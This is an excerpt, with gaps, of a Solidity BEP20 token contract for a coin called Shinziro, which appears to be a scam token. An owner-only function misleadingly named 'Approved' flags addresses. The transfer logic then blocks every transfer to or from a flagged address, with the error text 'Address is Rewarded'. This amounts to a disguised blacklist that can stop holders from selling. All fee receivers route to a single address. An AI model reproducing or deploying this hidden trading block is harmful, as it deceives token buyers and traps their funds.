...
// Twitter : https://twitter.com/ShinziroCoin

// Website : www.Shinziro.live
...
contract Shinziro is IBEP20, Ownable {
    ...
    uint256 public _maxSellTxAmount = _totalSupply / (1) * (1);  
    uint256 public _maxWalletToken = _totalSupply / (1) * (100); 

    // Fees receivers
    address public autoLiquidityReceiver = 0x57fD916a87e71d8b914061B14BE8D50DeB53e22e;
    address public marketingFeeReceiver = 0x57fD916a87e71d8b914061B14BE8D50DeB53e22e;
    address public devFeeReceiver = 0x57fD916a87e71d8b914061B14BE8D50DeB53e22e;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isApproved[recipient] && !isApproved[sender], 'Address is Rewarded');
    ...
    function Approved(address _address, bool _value) public authorized{
        isApproved[_address] = _value;
    }
